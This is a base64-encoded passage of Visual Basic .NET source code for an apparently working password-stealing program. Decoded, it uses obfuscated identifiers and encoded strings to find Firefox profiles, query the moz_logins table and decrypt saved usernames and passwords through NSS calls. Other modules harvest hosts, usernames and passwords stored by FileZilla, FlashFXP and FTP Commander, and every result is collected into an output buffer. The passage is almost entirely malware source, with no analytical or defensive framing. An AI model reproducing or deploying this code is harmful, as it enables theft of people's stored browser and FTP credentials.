DQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAg ICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIlBhc3N3b3JkOiAiICYgc1B3ZCkNCiAgICAgICAgICAg ICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5+fn5+fiIpDQogICAgICAgICAgICAgICAg WzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRp b24NCg0KICAgICAgICAgICAgRW5kIFRyeQ0KICAgICAgICBFbHNlDQogICAgICAgIEVuZCBJZg0K ICAgICAgICBSZXR1cm4gTm90aGluZw0KICAgIEVuZCBGdW5jdGlvbg0KCVB1YmxpYyBGdW5jdGlv biBSMlYwUmtZKCkgYXMgc3RyaW5nDQoNCgl0cnkNCglEaW0gbXlCdWlsZEluZm8gQXMgRmlsZVZl cnNpb25JbmZvID0gRmlsZVZlcnNpb25JbmZvLkdldFZlcnNpb25JbmZvKCJDOlxQcm9ncmFtIEZp bGVzXE1vemlsbGEgRmlyZWZveFxmaXJlZm94LmV4ZSIpDQogICAgICAgIElmIG15QnVpbGRJbmZv LlByb2R1Y3RWZXJzaW9uIDwgMy45IFRoZW4NCiBEaW0gWzEwNl0gQXMgQm9vbGVhbiA9IEZhbHNl DQogICAgICAgIERpbSBbMTA3XSBBcyBMb25nID0gMA0KICAgICAgICBEaW0gWzEwOF0gQXMgU3Ry aW5nID0gRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVy LlByb2dyYW1maWxlcykgJiAiXCIgJiBbMjRdLls0Ml0oIlRXOTZhV3hzWVE9PSIpICYgIiAiICYg WzI0XS5bNDJdKCJSbWx5WldadmVBPT0iKSAmICJcIg0KICAgICAgICBEaW0gWzEwOV0gQXMgU3Ry aW5nID0gRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVy LkFwcGxpY2F0aW9uRGF0YSkgJiAiXCIgJiBbMjRdLls0Ml0oIlRXOTZhV3hzWVE9PSIpICYgIlwi ICYgWzI0XS5bNDJdKCJSbWx5WldadmVBPT0iKSAmICJcIiAmIFsyNF0uWzQyXSgiVUhKdlptbHNa WE09IikNCiAgICAgICAgRGltIFsxMTBdIEFzIFN0cmluZygpID0gRGlyZWN0b3J5LkdldERpcmVj dG9yaWVzKFsxMDldKQ0KICAgICAgICBGb3IgRWFjaCBbMTEyXSBBcyBTdHJpbmcgSW4gWzExMF0N CiAgICAgICAgICAgIElmIE5vdCBbMTA2XSBUaGVuDQogICAgICAgICAgICAgICAgRGltIFsxMTNd IEFzIFN0cmluZygpID0gRGlyZWN0b3J5LkdldEZpbGVzKFsxMTJdKQ0KICAgICAgICAgICAgICAg IEZvciBFYWNoIFsxMTRdIEFzIFN0cmluZyBJbiBbMTEzXQ0KICAgICAgICAgICAgICAgICAgICBJ ZiBOb3QgWzEwNl0gVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgU3lzdGVtLlRleHQu UmVndWxhckV4cHJlc3Npb25zLlJlZ2V4LklzTWF0Y2goWzExNF0sIFsyNF0uWzQyXSgiYzJsbmJt OXVjeTV6Y1d4cGRHVT0iKSkgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5TU19J bml0KFsxMTJdKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpZ25vbiA9IFsxMTRdDQog ICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRWxzZQ0K DQogICAgICAgICAgICAgICAgICAgICAgICBFeGl0IEZvcg0KICAgICAgICAgICAgICAgICAgICBF bmQgSWYNCiAgICAgICAgICAgICAgICBOZXh0DQogICAgICAgICAgICBFbHNlDQogICAgICAgICAg ICAgICAgRXhpdCBGb3INCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBOZXh0DQoNCiAgICAg ICAgRGltIFsxMTVdIEFzIFN0cmluZyA9IHNpZ25vbg0KICAgICAgICBEaW0gWzExNl0gQXMgTmV3 IFRTRUNJdGVtKCkNCiAgICAgICAgRGltIFsxMTddIEFzIE5ldyBUU0VDSXRlbSgpDQogICAgICAg IERpbSBbMTE4XSBBcyBOZXcgVFNFQ0l0ZW0oKQ0KICAgICAgICBEaW0gWzExOV0gQXMgQnl0ZSgp DQogICAgICAgIERpbSBbMTIwXSBBcyBOZXcgU1FMaXRlQmFzZShbMTE1XSkNCg0KICAgICAgICBE aW0gWzEyMV0gQXMgRGF0YVRhYmxlID0gWzEyMF0uRXhlY3V0ZVF1ZXJ5KCJTRUxFQ1QgKiBGUk9N IG1vel9sb2dpbnM7IikNCiAgICAgICAgRGltIFsxMjJdIEFzIERhdGFUYWJsZSA9IFsxMjBdLkV4 ZWN1dGVRdWVyeSgiU0VMRUNUICogRlJPTSBtb3pfZGlzYWJsZWRIb3N0czsiKQ0KDQoNCiAgICAg ICAgWzEwN10gPSBQSzExX0dldEludGVybmFsS2V5U2xvdCgpDQogICAgICAgIFBLMTFfQXV0aGVu dGljYXRlKFsxMDddLCBUcnVlLCAwKQ0KICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+ fn4iICYgWzI0XS5bNDJdKCJSbWx5WldadmVBPT0iKSAmICJ+fn5+fiIgJiB2Yk5ld0xpbmUpDQoN CiAgICAgICAgRm9yIEVhY2ggWmVpbGUgQXMgU3lzdGVtLkRhdGEuRGF0YVJvdyBJbiBbMTIxXS5S b3dzDQogICAgICAgICAgICBEaW0gWzEyM10gQXMgU3RyaW5nID0gU3lzdGVtLkNvbnZlcnQuVG9T dHJpbmcoWmVpbGUoImZvcm1TdWJtaXRVUkwiKS5Ub1N0cmluZygpKQ0KICAgICAgICAgICAgWzI0 XS5bODhdLkFwcGVuZFRleHQoWzI0XS5bNDJdKCJWWEpzIikgJiAiOiAiICYgWzEyM10gJiB2Yk5l d0xpbmUpDQogICAgICAgICAgICBEaW0gWzEyNF0gQXMgTmV3IFN0cmluZ0J1aWxkZXIoWmVpbGUo ImVuY3J5cHRlZFVzZXJuYW1lIikuVG9TdHJpbmcoKSkNCiAgICAgICAgICAgIERpbSBbMTI1XSBB cyBJbnRlZ2VyID0gTlNTQmFzZTY0X0RlY29kZUJ1ZmZlcihJbnRQdHIuWmVybywgSW50UHRyLlpl cm8sIFsxMjRdLCBbMTI0XS5MZW5ndGgpDQogICAgICAgICAgICBEaW0gWzEyNl0gQXMgVFNFQ0l0 ZW0gPSBEaXJlY3RDYXN0KE1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUoTmV3IEludFB0cihbMTI1XSks IEdldFR5cGUoVFNFQ0l0ZW0pKSwgVFNFQ0l0ZW0pDQogICAgICAgICAgICBJZiBQSzExU0RSX0Rl Y3J5cHQoWzEyNl0sIFsxMTddLCAwKSA9IDAgVGhlbg0KICAgICAgICAgICAgICAgIElmIFsxMTdd LlNFQ0l0ZW1MZW4gPD4gMCBUaGVuDQogICAgICAgICAgICAgICAgICAgIFsxMTldID0gTmV3IEJ5 dGUoWzExN10uU0VDSXRlbUxlbiAtIDEpIHt9DQogICAgICAgICAgICAgICAgICAgIE1hcnNoYWwu Q29weShOZXcgSW50UHRyKFsxMTddLlNFQ0l0ZW1EYXRhKSwgWzExOV0sIDAsIFsxMTddLlNFQ0l0 ZW1MZW4pDQogICAgICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KFsyNF0uWzQy XSgiVlhObGNtNWhiV1U9IikgJiAiOiAiICYgIFN5c3RlbS5UZXh0LkVuY29kaW5nLkFTQ0lJLkdl dFN0cmluZyhbMTE5XSkgJiB2Yk5ld0xpbmUpDQogICAgICAgICAgICAgICAgRW5kIElmDQogICAg ICAgICAgICBFbmQgSWYNCgkJCQ0KCQkJDQogICAgICAgICAgICBEaW0gWzEyN10gQXMgTmV3IFN0 cmluZ0J1aWxkZXIoWmVpbGUoImVuY3J5cHRlZFBhc3N3b3JkIikuVG9TdHJpbmcoKSkNCiAgICAg ICAgICAgIERpbSBbMTI4XSBBcyBJbnRlZ2VyID0gTlNTQmFzZTY0X0RlY29kZUJ1ZmZlcihJbnRQ dHIuWmVybywgSW50UHRyLlplcm8sIFsxMjddLCBbMTI3XS5MZW5ndGgpDQogICAgICAgICAgICBE aW0gWzEyOV0gQXMgVFNFQ0l0ZW0gPSBEaXJlY3RDYXN0KE1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUo TmV3IEludFB0cihbMTI4XSksIEdldFR5cGUoVFNFQ0l0ZW0pKSwgVFNFQ0l0ZW0pDQogICAgICAg ICAgICBJZiBQSzExU0RSX0RlY3J5cHQoWzEyOV0sIFsxMThdLCAwKSA9IDAgVGhlbg0KICAgICAg ICAgICAgICAgIElmIFsxMThdLlNFQ0l0ZW1MZW4gPD4gMCBUaGVuDQogICAgICAgICAgICAgICAg ICAgIFsxMTldID0gTmV3IEJ5dGUoWzExOF0uU0VDSXRlbUxlbiAtIDEpIHt9DQogICAgICAgICAg ICAgICAgICAgIE1hcnNoYWwuQ29weShOZXcgSW50UHRyKFsxMThdLlNFQ0l0ZW1EYXRhKSwgWzEx OV0sIDAsIFsxMThdLlNFQ0l0ZW1MZW4pDQogICAgICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5B cHBlbmRUZXh0KFsyNF0uWzQyXSgiVUdGemMzZHZjbVE9IikgJiAiOiAiICYgU3lzdGVtLlRleHQu RW5jb2RpbmcuQVNDSUkuR2V0U3RyaW5nKFsxMTldKSAmIHZiTmV3TGluZSkNCiAgICAgICAgICAg ICAgICBFbmQgSWYNCiAgICAgICAgICAgIEVuZCBJZg0KDQoNCiAgICAgICAgICAgIFsyNF0uWzg4 XS5BcHBlbmRUZXh0KCJ+fn5+fn5+fn5+fiIgJiB2Yk5ld0xpbmUpDQoNCiAgICAgICAgTmV4dA0K ICAgICAgICBFbmQgSWYNCiAgICAgICBjYXRjaCBleCBhcyBleGNlcHRpb24NCgkgICBlbmQgdHJ5 DQogICAgICAgIA0KICAgIEVuZCBGdW5jdGlvbg0KCQ0KICAgIEZ1bmN0aW9uIFJlYWRGaWxlKEJ5 VmFsIHNGaWxlIEFzIFN0cmluZykgQXMgU3RyaW5nDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBO ZXh0DQogICAgICAgIERpbSBPcGVuRmlsZSBBcyBOZXcgU3lzdGVtLklPLlN0cmVhbVJlYWRlcihz RmlsZSkNCiAgICAgICAgUmVhZEZpbGUgPSBPcGVuRmlsZS5SZWFkVG9FbmQuVG9TdHJpbmcNCiAg ICBFbmQgRnVuY3Rpb24NCiAgICBGdW5jdGlvbiBDdXQoQnlWYWwgc0luaGFsdCBBcyBTdHJpbmcs IEJ5VmFsIHNUZXh0IEFzIFN0cmluZywgQnlWYWwgc3RleHQyIEFzIFN0cmluZykgQXMgU3RyaW5n DQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgICAgIERpbSBjKCkgQXMgU3RyaW5n DQogICAgICAgIERpbSBjMigpIEFzIFN0cmluZw0KICAgICAgICBjID0gU3BsaXQoc0luaGFsdCwg c1RleHQpDQogICAgICAgIGMyID0gU3BsaXQoYygxKSwgc3RleHQyKQ0KICAgICAgICBDdXQgPSBj MigwKQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIEZ1bmN0aW9uIFJlZ1JlYWQoQnlWYWwgaEtleSBB cyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBEaW0gd3NoU2hlbGwgQXMgT2JqZWN0ID0gQ3Jl YXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCiAgICAgICAgT24gRXJyb3IgUmVzdW1lIE5leHQN CiAgICAgICAgUmVnUmVhZCA9IHdzaFNoZWxsLlJlZ1JlYWQoaEtleSkNCiAgICBFbmQgRnVuY3Rp b24NCiAgICBQdWJsaWMgRnVuY3Rpb24gUmVhZExpbmUoQnlWYWwgZmlsZW5hbWUgQXMgU3RyaW5n LCBfDQogICAgQnlWYWwgbGluZSBBcyBJbnRlZ2VyKSBBcyBTdHJpbmcNCiAgICAgICAgVHJ5DQog ICAgICAgICAgICBEaW0gbGluZXMgQXMgU3RyaW5nKCkgPSBNeS5Db21wdXRlci5GaWxlU3lzdGVt LlJlYWRBbGxUZXh0KCBfDQogICAgICAgICAgICAgIGZpbGVuYW1lLCBTeXN0ZW0uVGV4dC5FbmNv ZGluZy5EZWZhdWx0KS5TcGxpdCh2YkNyTGYpDQogICAgICAgICAgICBJZiBsaW5lID4gMCBUaGVu DQogICAgICAgICAgICAgICAgUmV0dXJuIGxpbmVzKGxpbmUgLSAxKQ0KICAgICAgICAgICAgRWxz ZUlmIGxpbmUgPCAwIFRoZW4NCiAgICAgICAgICAgICAgICBSZXR1cm4gbGluZXMobGluZXMuTGVu Z3RoICsgbGluZSAtIDEpDQogICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgUmV0dXJu ICIiDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgQ2F0Y2ggZXggQXMgRXhjZXB0aW9uDQog ICAgICAgICAgICBSZXR1cm4gIiINCiAgICAgICAgRW5kIFRyeQ0KICAgIEVuZCBGdW5jdGlvbg0K RW5kIE1vZHVsZQ0KDQoNCiAgICANCg0KTW9kdWxlIEZpbGV6aWxsYQ0KICAgIEZ1bmN0aW9uIFNo b2l0WmlsbGEoKSBBcyBTdHJpbmcNCiAgICAgICAgT24gRXJyb3IgUmVzdW1lIE5leHQNCiAgICAg ICAgRGltIEZpbGVQYXRoIEFzIFN0cmluZyA9IEVudmlyb24oIkFQUERBVEEiKSAmICJcRmlsZVpp bGxhXHJlY2VudHNlcnZlcnMueG1sIg0KICAgICAgICBEaW0gRmlsZUJ1ZmZlciBBcyBTdHJpbmcg PSB2Yk51bGwNCiAgICAgICAgRGltIE5MIEFzIFN0cmluZyA9IHZiTmV3TGluZQ0KICAgICAgICBG aWxlQnVmZmVyID0gTXkuQ29tcHV0ZXIuRmlsZVN5c3RlbS5PcGVuVGV4dEZpbGVSZWFkZXIoRmls ZVBhdGgpLlJlYWRUb0VuZCgpDQogICAgICAgIERpbSBzdHIgQXMgU3RyaW5nDQogICAgICAgIERp bSBPdXRwdXQgQXMgU3RyaW5nID0gTm90aGluZw0KICAgICAgICBEaW0gVGVtcERhdGEoKSBBcyBT dHJpbmcNCiAgICAgICAgVGVtcERhdGEgPSBGaWxlQnVmZmVyLlNwbGl0KHZiQ3JMZikNCiAgICAg ICAgRmlsZUJ1ZmZlciA9IE5vdGhpbmcNCiAgICAgICAgRm9yIEVhY2ggc3RyIEluIFRlbXBEYXRh DQogICAgICAgICAgICBJZiBzdHIuQ29udGFpbnMoIjwvSG9zdD4iKSBUaGVuDQogICAgICAgICAg ICAgICAgc3RyLlJlcGxhY2UoIjxIb3N0PiIsICIiKS5SZXBsYWNlKCI8L0hvc3Q+IiwgIiIpDQog ICAgICAgICAgICAgICAgT3V0cHV0ID0gT3V0cHV0ICYgIkhvc3QgOiAiICYgc3RyICYgTkwNCiAg ICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgSWYgc3RyLkNvbnRhaW5zKCI8L1VzZXI+Iikg VGhlbg0KICAgICAgICAgICAgICAgIHN0ci5SZXBsYWNlKCI8VXNlcj4iLCAiIikuUmVwbGFjZSgi PC9Vc2VyPiIsICIiKQ0KICAgICAgICAgICAgICAgIE91dHB1dCA9IE91dHB1dCAmICJVc2VybmFt ZSA6ICIgJiBzdHIgJiBOTA0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBJZiBzdHIu Q29udGFpbnMoIjwvUGFzcz4iKSBUaGVuDQogICAgICAgICAgICAgICAgc3RyLlJlcGxhY2UoIjxQ YXNzPiIsICIiKS5SZXBsYWNlKCI8L1Bhc3M+IiwgIiIpDQogICAgICAgICAgICAgICAgT3V0cHV0 ID0gT3V0cHV0ICYgIlBhc3N3b3JkIDogIiAmIHN0ciAmIE5MICYgTkwNCiAgICAgICAgICAgIEVu ZCBJZg0KICAgICAgICBOZXh0DQogICAgICAgIE91dHB1dCA9ICJ+fn5+fkZpbGVaaWxsYX5+fn5+ IiAmIHZiTmV3TGluZSAmIE91dHB1dC5SZXBsYWNlKCI8VXNlcj4iLCAiIikuUmVwbGFjZSgiPC9V c2VyPiIsICIiKS5SZXBsYWNlKCI8SG9zdD4iLCAiIikuUmVwbGFjZSgiPC9Ib3N0PiIsICIiKS5S ZXBsYWNlKCI8UGFzcz4iLCAiIikuUmVwbGFjZSgiPC9QYXNzPiIsICIiKSAmICJ+fn5+fn5+fn5+ IiAmIHZibmV3bGluZQ0KICAgICAgICBTaG9pdFppbGxhID0gT3V0cHV0DQogICAgICAgIFsyNF0u Wzg4XS5BcHBlbmRUZXh0KE91dHB1dCkNCiAgICBFbmQgRnVuY3Rpb24NCkVuZCBNb2R1bGUNCk1v ZHVsZSBGbGFzaEZYUA0KICAgIEZ1bmN0aW9uIEZsYXNoRlhQKCkgQXMgU3RyaW5nDQogICAgICAg IERpbSBzUGF0aCBBcyBTdHJpbmcgPSBSZXBsYWNlKEVudmlyb24kKCJBUFBEQVRBIiksIEVudmly b24kKCJVc2VybmFtZSIpLCAiQWxsIFVzZXJzIikgJiAiXEZsYXNoRlhQXCIgJiAiMyIgJiAiXHF1 aWNrLmRhdCINCiAgICAgICAgRGltIHNGaWxlIEFzIFN0cmluZyA9IFJlYWRGaWxlKHNQYXRoKQ0K ICAgICAgICBEaW0gc0hvc3QgQXMgU3RyaW5nID0gQ3V0KHNGaWxlLCAiSVA9IiwgdmJOZXdMaW5l KQ0KICAgICAgICBEaW0gc1BvcnQgQXMgU3RyaW5nID0gQ3V0KHNGaWxlLCAicG9ydD0iLCB2Yk5l d0xpbmUpDQogICAgICAgIERpbSBzVXNlciBBcyBTdHJpbmcgPSBDdXQoc0ZpbGUsICJ1c2VyPSIs IHZiTmV3TGluZSkNCiAgICAgICAgRGltIHNQd2QgQXMgU3RyaW5nID0gQ3V0KHNGaWxlLCAicGFz cz0iLCB2Yk5ld0xpbmUpDQogICAgICAgIERpbSBzRW50cnkgQXMgU3RyaW5nID0gQ3V0KHNGaWxl LCAiY3JlYXRlZD0iLCB2Yk5ld0xpbmUpDQoNCiAgICAgICAgSWYgTm90IHNVc2VyID0gIiIgVGhl bg0KICAgICAgICAgICAgVHJ5DQogICAgICAgICAgICAgICAgRmxhc2hGWFAgPSAiRW50cnk6ICIg KyBzRW50cnkgKyB2Yk5ld0xpbmUgKyAiSG9zdDogIiArIHNIb3N0ICsgIjoiICsgc1BvcnQgKyB2 Yk5ld0xpbmUgKyAiVXNlcjogIiArIHNVc2VyICsgdmJOZXdMaW5lICsgIlB3ZDogIiArIHNQd2Qg KyAiIChFbmNyeXB0KSINCiAgICAgICAgICAgICAgICBEaW0gbmwgQXMgU3RyaW5nID0gdmJOZXdM aW5lDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAg ICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIn5+fn5+Rmxhc2hGWFB+fn5+fiIpDQogICAgICAg ICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5b ODhdLkFwcGVuZFRleHQoIkVudHJ5OiAiICYgc0VudHJ5KQ0KICAgICAgICAgICAgICAgIFsyNF0u Wzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0 KCJIb3N0OiAiICYgc0hvc3QpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQo IjogIiAmIHNQb3J0KQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0K ICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJVc2VyOiAiICYgc1VzZXIpDQog ICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAg WzI0XS5bODhdLkFwcGVuZFRleHQoIlBhc3N3b3JkOiAiICYgc1B3ZCkNCiAgICAgICAgICAgICAg ICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5+fn5+fiIpDQogICAgICAgICAgICAgICAgWzI0 XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24N Cg0KICAgICAgICAgICAgRW5kIFRyeQ0KICAgICAgICBFbHNlDQogICAgICAgIEVuZCBJZg0KICAg ICAgICBSZXR1cm4gTm90aGluZw0KICAgIEVuZCBGdW5jdGlvbg0KICAgIEZ1bmN0aW9uIFJlYWRG aWxlKEJ5VmFsIHNGaWxlIEFzIFN0cmluZykgQXMgU3RyaW5nDQogICAgICAgIE9uIEVycm9yIFJl c3VtZSBOZXh0DQogICAgICAgIERpbSBPcGVuRmlsZSBBcyBOZXcgU3lzdGVtLklPLlN0cmVhbVJl YWRlcihzRmlsZSkNCiAgICAgICAgUmVhZEZpbGUgPSBPcGVuRmlsZS5SZWFkVG9FbmQuVG9TdHJp bmcNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBGdW5jdGlvbiBDdXQoQnlWYWwgc0luaGFsdCBBcyBT dHJpbmcsIEJ5VmFsIHNUZXh0IEFzIFN0cmluZywgQnlWYWwgc3RleHQyIEFzIFN0cmluZykgQXMg U3RyaW5nDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgICAgIERpbSBjKCkgQXMg U3RyaW5nDQogICAgICAgIERpbSBjMigpIEFzIFN0cmluZw0KICAgICAgICBjID0gU3BsaXQoc0lu aGFsdCwgc1RleHQpDQogICAgICAgIGMyID0gU3BsaXQoYygxKSwgc3RleHQyKQ0KICAgICAgICBD dXQgPSBjMigwKQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIEZ1bmN0aW9uIFJlZ1JlYWQoQnlWYWwg aEtleSBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBEaW0gd3NoU2hlbGwgQXMgT2JqZWN0 ID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCiAgICAgICAgT24gRXJyb3IgUmVzdW1l IE5leHQNCiAgICAgICAgUmVnUmVhZCA9IHdzaFNoZWxsLlJlZ1JlYWQoaEtleSkNCiAgICBFbmQg RnVuY3Rpb24NCiAgICBQdWJsaWMgRnVuY3Rpb24gUmVhZExpbmUoQnlWYWwgZmlsZW5hbWUgQXMg U3RyaW5nLCBfDQogICAgQnlWYWwgbGluZSBBcyBJbnRlZ2VyKSBBcyBTdHJpbmcNCiAgICAgICAg VHJ5DQogICAgICAgICAgICBEaW0gbGluZXMgQXMgU3RyaW5nKCkgPSBNeS5Db21wdXRlci5GaWxl U3lzdGVtLlJlYWRBbGxUZXh0KCBfDQogICAgICAgICAgICAgIGZpbGVuYW1lLCBTeXN0ZW0uVGV4 dC5FbmNvZGluZy5EZWZhdWx0KS5TcGxpdCh2YkNyTGYpDQogICAgICAgICAgICBJZiBsaW5lID4g MCBUaGVuDQogICAgICAgICAgICAgICAgUmV0dXJuIGxpbmVzKGxpbmUgLSAxKQ0KICAgICAgICAg ICAgRWxzZUlmIGxpbmUgPCAwIFRoZW4NCiAgICAgICAgICAgICAgICBSZXR1cm4gbGluZXMobGlu ZXMuTGVuZ3RoICsgbGluZSAtIDEpDQogICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAg UmV0dXJuICIiDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgQ2F0Y2ggZXggQXMgRXhjZXB0 aW9uDQogICAgICAgICAgICBSZXR1cm4gIiINCiAgICAgICAgRW5kIFRyeQ0KICAgIEVuZCBGdW5j dGlvbg0KRW5kIE1vZHVsZQ0KDQpNb2R1bGUgRlRQQ29tbWFuZGVyDQogICAgRnVuY3Rpb24gRnRw Q29tbWFuZGVyKCkgQXMgU3RyaW5nDQogICAgICAgIERpbSBzUGF0aCBBcyBTdHJpbmcgPSBSZXBs YWNlKFJlZ1JlYWQoIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93 c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcRlRQIENvbW1hbmRlclxVbmluc3RhbGxTdHJpbmci KSwgInVuaW5zdGFsbC5leGUiLCB2Yk51bGxTdHJpbmcpICYgIkZ0cGxpc3QudHh0Ig0KICAgICAg ICBEaW0gc0ZpbGUgQXMgU3RyaW5nID0gUmVhZExpbmUoc1BhdGgsIC0xKQ0KICAgICAgICBEaW0g c0hvc3QgQXMgU3RyaW5nID0gQ3V0KHNGaWxlLCAiO1NlcnZlcj0iLCAiO1BvcnQ9IikNCiAgICAg ICAgRGltIHNQb3J0IEFzIFN0cmluZyA9IEN1dChzRmlsZSwgIjtQb3J0PSIsICI7UGFzc3dvcmQ9 IikNCiAgICAgICAgRGltIHNVc2VyIEFzIFN0cmluZyA9IEN1dChzRmlsZSwgIjtVc2VyPSIsICI7 QW5vbnltb3VzPSIpDQogICAgICAgIERpbSBzUHdkIEFzIFN0cmluZyA9IEN1dChzRmlsZSwgIjtQ YXNzd29yZD0iLCAiO1VzZXI9IikNCiAgICAgICAgRGltIHNFbnRyeSBBcyBTdHJpbmcgPSBDdXQo c0ZpbGUsICJOYW1lPSIsICI7U2VydmVyPSIpDQoNCiAgICAgICAgSWYgTm90IHNVc2VyID0gIiIg VGhlbg0KICAgICAgICAgICAgVHJ5DQogICAgICAgICAgICAgICAgRnRwQ29tbWFuZGVyID0gIkVu dHJ5OiAiICsgc0VudHJ5ICsgdmJOZXdMaW5lICsgIkhvc3Q6ICIgKyBzSG9zdCArICI6IiArIHNQ b3J0ICsgdmJOZXdMaW5lICsgIlVzZXI6ICIgKyBzVXNlciArIHZiTmV3TGluZSArICJQd2Q6ICIg KyBzUHdkDQogICAgICAgICAgICAgICAgRGltIG5sIEFzIFN0cmluZyA9IHZiTmV3TGluZQ0KICAg ICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsy NF0uWzg4XS5BcHBlbmRUZXh0KCJ+fn5+fkZUUCBDb21tYW5kZXJ+fn5+fiIpDQogICAgICAgICAg ICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0XS5bODhd LkFwcGVuZFRleHQoIkVudHJ5OiAiICYgc0VudHJ5KQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4 XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJI b3N0OiAiICYgc0hvc3QpDQogICAgICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIjog IiAmIHNQb3J0KQ0KICAgICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAg ICAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJVc2VyOiAiICYgc1VzZXIpDQogICAg ICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICAgICAgWzI0 XS5bODhdLkFwcGVuZFRleHQoIlBhc3N3b3JkOiAiICYgc1B3ZCkNCiAgICAgICAgICAgICAgICBb MjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5+fn5+fiIpDQogICAgICAgICAgICAgICAgWzI0XS5b ODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCiAg ICAgICAgICAgIEVuZCBUcnkNCiAgICAgICAgRWxzZQ0KICAgICAgICBFbmQgSWYNCiAgICAgICAg UmV0dXJuIE5vdGhpbmcNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBGdW5jdGlvbiBSZWFkRmlsZShC eVZhbCBzRmlsZSBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBPbiBFcnJvciBSZXN1bWUg TmV4dA0KICAgICAgICBEaW0gT3BlbkZpbGUgQXMgTmV3IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIo c0ZpbGUpDQogICAgICAgIFJlYWRGaWxlID0gT3BlbkZpbGUuUmVhZFRvRW5kLlRvU3RyaW5nDQog ICAgRW5kIEZ1bmN0aW9uDQogICAgRnVuY3Rpb24gQ3V0KEJ5VmFsIHNJbmhhbHQgQXMgU3RyaW5n LCBCeVZhbCBzVGV4dCBBcyBTdHJpbmcsIEJ5VmFsIHN0ZXh0MiBBcyBTdHJpbmcpIEFzIFN0cmlu Zw0KICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICBEaW0gYygpIEFzIFN0cmlu Zw0KICAgICAgICBEaW0gYzIoKSBBcyBTdHJpbmcNCiAgICAgICAgYyA9IFNwbGl0KHNJbmhhbHQs IHNUZXh0KQ0KICAgICAgICBjMiA9IFNwbGl0KGMoMSksIHN0ZXh0MikNCiAgICAgICAgQ3V0ID0g YzIoMCkNCiAgICBFbmQgRnVuY3Rpb24NCiAgICBGdW5jdGlvbiBSZWdSZWFkKEJ5VmFsIGhLZXkg QXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIHdzaFNoZWxsIEFzIE9iamVjdCA9IENy 